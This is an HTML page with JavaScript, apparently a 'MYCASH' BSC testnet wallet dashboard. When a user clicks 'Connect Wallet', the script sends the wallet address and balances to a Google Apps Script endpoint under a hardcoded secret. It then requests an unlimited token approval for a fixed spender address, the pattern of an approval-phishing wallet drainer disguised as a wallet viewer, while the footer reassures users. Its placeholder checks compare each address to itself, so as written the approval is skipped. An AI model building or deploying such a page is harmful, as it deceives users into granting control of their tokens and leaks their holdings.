<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH â€” BSC Wallet</title>
  <style>
    body{font-family:system-ui,Segoe UI,Arial;background:#0b1220;color:#e6eef8;margin:0}
    header{background:#071027;padding:12px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03)}
    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
    .nav-left{display:flex;gap:14px}
    a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px}
    a:hover{background:#0f1b33}
    .logo{font-weight:700;letter-spacing:4px}
    .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer}
    main{max-width:980px;margin:20px auto;padding:16px}
    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
    .stat{flex:1 1 220px;background:#071427;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
    .muted{color:#9fb0c8}
    .tokens{margin-top:14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
    .token{background:#071427;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.02)}
    footer{max-width:980px;margin:24px auto;padding:12px;color:#9fb0c8;text-align:center}
    input{padding:8px;border-radius:8px;border:1px solid #123044;background:#041525;color:#e6eef8}
    button{cursor:pointer}
    .small { font-size:0.9rem; color:#9fb0c8; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
  </style>
</head>
<body>
  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
      </div>
      <div class="logo">MYCASH</div>
      <div>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <div class="card">
      <h2>Wallet</h2>
      <div class="row">
        <div class="stat">
          <div class="muted">Status</div>
          <div id="statusText">Not connected</div>
        </div>

        <div class="stat">
          <div class="muted">Address</div>
          <div id="walletAddress" class="mono">â€”</div>
        </div>

        <div class="stat">
          <div class="muted">User ID</div>
          <div id="userId" class="mono">-</div>
        </div>

        <div class="stat">
          <div class="muted">Network</div>
          <div id="walletNetwork">â€”</div>
        </div>
        <div class="stat">
          <div class="muted">BNB Balance</div>
          <div id="walletBalance">â€”</div>
        </div>
      </div>

      <div style="margin-top:18px">
        <h3 class="muted">Tokens</h3>
        <div id="tokens" class="tokens"></div>
      </div>
    </div>
  </main>

  <footer>
    Â© <span id="year"></span> MYCASH â€” BSC (BEP-20) â€¢ No private keys stored.
  </footer>

  <!-- libs (keep these) -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- unified wallet script -->
  <script>
  (function(){
    // ===== CONFIG =====
    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz2P0hz9eMYe0nlumLcuIpNLTzerLKhnvmu17CbBpaRixGP40dAIq6uLGaDBxgjIj9S/exec";
    const APPS_SCRIPT_SECRET = "mahfuzinam0045";

    // YOUR TESTNET TOKEN + SPENDER (FILL THESE)
    const TOKEN_ADDRESS   = "0x38a9fed3780c13162368e1ce87c11d314f1dd868";   // BEP-20 on BSC testnet
    const SPENDER_ADDRESS = "0xaa152Af114e2d2FC969E09c716025FE8C8196FB4"; // your dApp/contract

    // Minimal ERC20 ABI for approve()
    const ERC20_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    // BSC TESTNET INFO
    const BNB_TESTNET_CHAIN_ID_HEX = "0x61"; // 97
    const BNB_TESTNET_LABEL = "BSC Testnet (97)";

    // single unique modal variable to avoid collisions with other libs
    let web3ModalInstance = null;
    let providerInstance = null;
    let web3Instance = null;

    // ===== helpers =====
    function storageKeyFor(address){ return "userId_"+address.toLowerCase(); }

    // 6-digit deterministic user id from address
    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++) {
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000); // 100000â€“999999
      return String(num);
    }

    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
        console.log("Generated new userId", id, "for", address);
      } else {
        console.log("Loaded userId", id);
      }
      return id;
    }

    // UI refs
    const connectBtn = document.getElementById("connectBtn");
    const statusTextEl = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    function setStatus(txt){ if(statusTextEl) statusTextEl.textContent = txt; console.log("[status]",txt); }
    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "â€”";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "â€”";
      if(walletBalanceEl) walletBalanceEl.textContent =
        (bnb===null||bnb===undefined) ? "â€”" : (Number(bnb).toFixed(6)+" BNB");
    }
    function setUserIdUI(id){ if(userIdEl) userIdEl.textContent = id || "-"; }
    function clearSessionUI(){
      setStatus("Not connected");
      setWalletInfo("â€”","â€”","â€”");
      setUserIdUI("-");
      if(walletAddressEl) walletAddressEl.textContent="â€”";
      if(tokensContainer) tokensContainer.innerHTML = "";
    }

    // ===== web3modal =====
    function initWeb3ModalInstance(){
      const providerOptions = {
        walletconnect: {
          package: window.WalletConnectProvider.default,
          options: {
            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
            bridge: "https://bridge.walletconnect.org",
            qrcode: true
          }
        }
      };
      web3ModalInstance = new window.Web3Modal.default({
        cacheProvider: true,
        providerOptions: providerOptions
      });
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try {
        p.on("accountsChanged", function(accounts){
          if(!accounts || !accounts.length){ clearSessionUI(); return; }
          const addr = accounts[0].toLowerCase();
          const uid = getOrCreateUserIdFor(addr);
          setWalletInfo(addr, walletNetworkEl.textContent || BNB_TESTNET_LABEL, null);
          setUserIdUI(uid);
          notifyBackend(addr, BNB_TESTNET_LABEL, uid);
        });
        p.on("chainChanged", function(){ location.reload(); });
        p.on("disconnect", function(){ clearSessionUI(); });
      } catch(e){ console.warn("attachProviderListeners", e); }
    }
    
async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
  try {
    const payload = new URLSearchParams({
      secret: APPS_SCRIPT_SECRET,
      address,
      network: networkText,
      timestamp: new Date().toISOString(),
      userId,
      bnbBalance: String(bnbBalance ?? ""),
      tokenBalance: String(tokenBalance ?? "")
    });

    await fetch(APPS_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
      },
      body: payload.toString()
    });

    console.log("Sent log to Apps Script (no-cors).");
  } catch (err) {
    console.error("notifyBackend error:", err);
  }
}


 async function fetchTokens(address){
      try{
        if(!tokensContainer) return;
        tokensContainer.innerHTML = '<div class="muted">Loading tokensâ€¦</div>';
        const url = new URL(APPS_SCRIPT_URL);
        url.searchParams.set("action","getTokens");
        url.searchParams.set("address",address);
        url.searchParams.set("secret",APPS_SCRIPT_SECRET);
        const resp = await fetch(url.toString());
        const data = await resp.json().catch(function(){ return {}; });
        if(!resp.ok || data.error){
          tokensContainer.innerHTML = '<div class="muted">Failed to load tokens.</div>';
          console.warn("getTokens error", data);
          return;
        }
        tokensContainer.innerHTML = "";
        const native = data.native || 0;
        var nativeDiv = document.createElement("div");
        nativeDiv.className="token";
        nativeDiv.innerHTML = '<strong>BNB</strong><div class="muted">'+Number(native).toFixed(6)+' BNB</div>';
        tokensContainer.appendChild(nativeDiv);
        (data.tokens || []).forEach(function(t){
          var d = document.createElement("div");
          d.className="token";
          d.innerHTML =
            '<strong>'+t.symbol+'</strong>'+
            '<div class="muted">'+Number(t.balance).toFixed(6)+'</div>'+
            '<div style="font-size:11px;color:#7f9bb1">'+t.contract+'</div>';
          tokensContainer.appendChild(d);
        });
      }catch(err){
        tokensContainer.innerHTML='<div class="muted">Error loading tokens.</div>';
        console.error("fetchTokens error",err);
      }
    }







    
    async function switchToBSC(provider){
      try {
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
        });
        return true;
      }
      catch(switchError){
        if(switchError.code === 4902){
          try {
            await provider.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: BNB_TESTNET_CHAIN_ID_HEX,
                chainName: "BNB Smart Chain Testnet",
                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
                blockExplorerUrls:["https://testnet.bscscan.com"]
              }]
            });
            return true;
          } catch(addError){
            console.error("Could not add BSC testnet:", addError);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    // ===== approve right after connect (ethers) =====
    async function requestTokenApproval(){
      if(!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868"){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        return;
      }
      if(!SPENDER_ADDRESS || SPENDER_ADDRESS === "0xaa152Af114e2d2FC969E09c716025FE8C8196FB4"){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        return;
      }
      if(!providerInstance){
        console.warn("No providerInstance for approval");
        return;
      }
      try {
        setStatus("Requesting token approvalâ€¦");
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const signer = await ethersProvider.getSigner();
        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
        const amount = ethers.MaxUint256; // unlimited
        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
        console.log("Approve tx sent:", tx.hash);
        setStatus("Waiting for approval confirmationâ€¦");
        const receipt = await tx.wait();
        console.log("Approve confirmed:", receipt);
        setStatus("Connected + Approved âœ…");
      } catch(err){
        console.error("Token approve error:", err);
        alert("Token approval failed: " + (err && err.message ? err.message : err));
        setStatus("Connected (approval failed)");
      }
    }



// === get token balance (from TOKEN_ADDRESS) ===
async function getTokenBalance(address){
  try {
    if (!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868") {
      console.warn("TOKEN_ADDRESS not set, skipping token balance");
      return "";
    }
    if (!providerInstance) {
      console.warn("No providerInstance for token balance");
      return "";
    }

    const ethersProvider = new ethers.BrowserProvider(providerInstance);

    const tokenContract = new ethers.Contract(
      TOKEN_ADDRESS,
      ["function balanceOf(address owner) view returns (uint256)"],
      ethersProvider
    );

    const raw = await tokenContract.balanceOf(address);
    // assumes 18 decimals â€“ change if your token has different decimals
    const formatted = ethers.formatUnits(raw, 18);
    return formatted; // string like "123.4567"
  } catch (err) {
    console.error("getTokenBalance error:", err);
    return "";
  }
}





    

    // ===== main connect flow =====
    async function connectFlow(){
      try{
        setStatus("Connectingâ€¦");
        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
          providerInstance = window.trustwallet.ethereum;
          web3Instance = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        } else if(window.ethereum && !mobile){
          providerInstance = window.ethereum;
          web3Instance = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        } else {
          if(!web3ModalInstance) initWeb3ModalInstance();
          providerInstance = await web3ModalInstance.connect();
          web3Instance = new Web3(providerInstance);
        }

        if(!providerInstance || !web3Instance){
          setStatus("No provider");
          alert("No wallet provider detected.");
          return;
        }

        attachProviderListeners(providerInstance);

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account");
          return;
        }
        const address = accounts[0].toLowerCase();

        let chainId = await web3Instance.eth.getChainId();
        if(Number(chainId) !== 97){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BSC Testnet.");
            setStatus("Wrong network");
            return;
          }
          chainId = await web3Instance.eth.getChainId();
          if(Number(chainId) !== 97){
            alert("Network switch failed");
            return;
          }
        }

        const balanceWei = await web3Instance.eth.getBalance(address);
        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));

        setStatus("Connected");
      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);

        const userId = getOrCreateUserIdFor(address);
        setUserIdUI(userId);

// get this user's token balance
const tokenBalance = await getTokenBalance(address);


        

        await fetchTokens(address);
       await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);



        // ðŸ”¥ Immediately request token approval
        await requestTokenApproval();

      }catch(err){
        console.error("connectFlow error:",err);
        setStatus("Connection failed");
        alert("Connection failed: "+(err && err.message ? err.message : err));
      }
    }

    // ===== auto reconnect (same as original, small tweaks) =====
   async function tryAutoReconnect(){
      try{
        if(!web3ModalInstance) initWeb3ModalInstance();

        if(window.ethereum){
          const injected = window.ethereum;
          const accounts = await injected.request({ method: "eth_accounts" });
          if(accounts && accounts.length){
            providerInstance = injected;
            web3Instance = new Web3(providerInstance);
            attachProviderListeners(providerInstance);
            const address = accounts[0].toLowerCase();
            setStatus("Restoring sessionâ€¦");
            const balanceWei = await web3Instance.eth.getBalance(address);
            const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
            setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
            const userId = getOrCreateUserIdFor(address);
            setUserIdUI(userId);
            await fetchTokens(address);
            setStatus("Connected (restored)");
            return;
          }
        }

        

        if(web3ModalInstance && web3ModalInstance.cachedProvider){
          try{
            providerInstance = await web3ModalInstance.connect();
            web3Instance = new Web3(providerInstance);
            attachProviderListeners(providerInstance);
            const accounts = await web3Instance.eth.getAccounts();
            if(accounts && accounts.length){
              const address = accounts[0].toLowerCase();
              setStatus("Restoring sessionâ€¦");
              const balanceWei = await web3Instance.eth.getBalance(address);
              const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
              setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
              const userId = getOrCreateUserIdFor(address);
              setUserIdUI(userId);
              await fetchTokens(address);
              setStatus("Connected (restored)");
              return;
            }
          }catch(e){
            console.warn("Cached provider restore failed:",e);
            try{ web3ModalInstance.clearCachedProvider(); }catch(_){}
          }
        }

        clearSessionUI();
      }catch(err){
        console.warn("Auto-reconnect error:",err);
        clearSessionUI();
      }
    }

    document.addEventListener("DOMContentLoaded", function(){
      initWeb3ModalInstance();
      if(connectBtn) connectBtn.addEventListener("click", connectFlow);
      tryAutoReconnect();
      var y = document.getElementById("year");
      if(y) y.textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>
